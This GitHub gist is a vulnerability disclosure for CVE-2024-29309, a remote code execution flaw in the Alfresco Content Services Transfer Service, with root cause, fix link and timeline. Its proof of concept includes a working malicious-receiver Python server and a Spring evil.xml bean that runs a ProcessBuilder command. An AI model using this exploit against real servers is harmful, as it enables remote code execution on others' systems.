=== Content from gist.github.com_67fdef8c_20250110_171211.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSiebene%2Fc22e1a4a4a8b61067180475895e60858)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FSiebene%2Fc22e1a4a4a8b61067180475895e60858&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSiebene%2Fc22e1a4a4a8b61067180475895e60858) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FSiebene%2Fc22e1a4a4a8b61067180475895e60858&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Siebene](https://avatars.githubusercontent.com/u/34935395?s=64&v=4)](/Siebene)

# [Siebene](/Siebene)/**[ACS-RCE.md](/Siebene/c22e1a4a4a8b61067180475895e60858)**

Last active
April 20, 2024 05:51

Show Gist options

* [Download ZIP](/Siebene/c22e1a4a4a8b61067180475895e60858/archive/0ba43801050e179f00ea7038a55120b319c8ebba.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FSiebene%2Fc22e1a4a4a8b61067180475895e60858)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FSiebene%2Fc22e1a4a4a8b61067180475895e60858)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Siebene/c22e1a4a4a8b61067180475895e60858.js&quot;&gt;&lt;/script&gt;
* Save Siebene/c22e1a4a4a8b61067180475895e60858 to your computer and use it in GitHub Desktop.

[Code](/Siebene/c22e1a4a4a8b61067180475895e60858)
[Revisions
8](/Siebene/c22e1a4a4a8b61067180475895e60858/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Siebene/c22e1a4a4a8b61067180475895e60858.js&quot;&gt;&lt;/script&gt;

Save Siebene/c22e1a4a4a8b61067180475895e60858 to your computer and use it in GitHub Desktop.

[Download ZIP](/Siebene/c22e1a4a4a8b61067180475895e60858/archive/0ba43801050e179f00ea7038a55120b319c8ebba.zip)

Alfresco Content Services has a remote code execution (RCE) vulnerability in the Transfer Service.

 [Raw](/Siebene/c22e1a4a4a8b61067180475895e60858/raw/0ba43801050e179f00ea7038a55120b319c8ebba/ACS-RCE.md)

[**ACS-RCE.md**](#file-acs-rce-md)

### Affected Product

Alfresco Content Services

### Affected/Fixed Version(s)

Affecting versions prior to 23.3.0.23

The issue has been fixed in version 23.3.0.23

### CVE ID

CVE-2024-29309

### Vulnerability Type

Remote Coed Execution

### Description

Alfresco Content Services has a remote code execution (RCE) vulnerability in the Transfer Service

### Root Cause

The vulnerability stems from a feature in the Transfer Service, which allows the configuration of the properties Endpoint Host and Endpoint Port for transfer folders. An attacker can exploit this by setting up a malicious Transfer Receiver, then configuring the Endpoint Host and Endpoint Port of the transfer folders to this malicious service.

### Proof of Concept

The Transfer Service allows the configuration of the properties Endpoint Host and Endpoint Port for transfer folders. An attacker can exploit this by setting up a malicious Transfer Receiver, then configuring the Endpoint Host and Endpoint Port of the transfer folders to this malicious service. This could lead to arbitrary code execution on Alfresco Content Services (ACS). Here are the detailed steps:

Refer to the [official documentation](https://docs.alfresco.com/content-services/latest/admin/replication/)

> 1. In the source repository, create a new folder in **Company Home > Data Dictionary > Transfers > Transfer Target Groups > Default Group**.
>
>    1. In the **New Folder** window specify a name, for example, Replica. You can add a title, and description of the new folder, if you wish.
>
>       A rule defined on the **Default Group** folder specializes the type of any folder created in it.
>
>       The type is set automatically by the folder rule to `trx:transferTarget`. This allows you add the required properties to define the replication target through the user interface.
>    2. Click **Edit Properties** on your new folder (Replica).
>    3. Specify the required properties:
>
>       1. Specify the **Endpoint Host**, **Endpoint Port**, **Username** and **Password**.
>       2. Click **Enabled** and **Save**.
>    4. Enable the replication service in your `alfresco-global.properties` file:
>
>       ```
>        replication.enabled=true
>
>       ```
>
>       and restart the source repository.

Here, the Endpoint Host and Endpoint Port are set to the address of the malicious server. Next, the attacker sets up two files to act as the malicious server.

```
from http.server import BaseHTTPRequestHandler, HTTPServer

class MyServer(BaseHTTPRequestHandler):
    def handle_request(self):
        if self.path == '/evil.xml':
            self.send_response(200)
            self.send_header('Content-type', 'text/xml')
            self.end_headers()
            with open('evil.xml', 'r') as file:
                self.wfile.write(bytes(file.read(), 'utf-8'))
        else:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(bytes('{"errorType":"org.springframework.context.support.ClassPathXmlApplicationContext","errorMessage":"http://Endpoint Host:Endpoint Port/evil.xml"}', "utf-8"))

    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        self.handle_request()

def run(server_class=HTTPServer, handler_class=MyServer, port=7575):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```

evil.xml

```
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>touch</value>
                <value>/tmp/siebene</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

`touch /tmp/siebene` was executed here.

### Fix

<https://github.com/Alfresco/alfresco-community-repo/commit/c31158a11303a0da88e3ba22be387f6ef21493ae>

### Timeline

March 7th: Sent the report to security@alfresco.com

April 3rd: Patch submitted to the [GitHub repository](https://github.com/Alfresco/alfresco-community-repo/pull/2573)

April 11th: Received a response, claiming that the report has been received

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FSiebene%2Fc22e1a4a4a8b61067180475895e60858)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


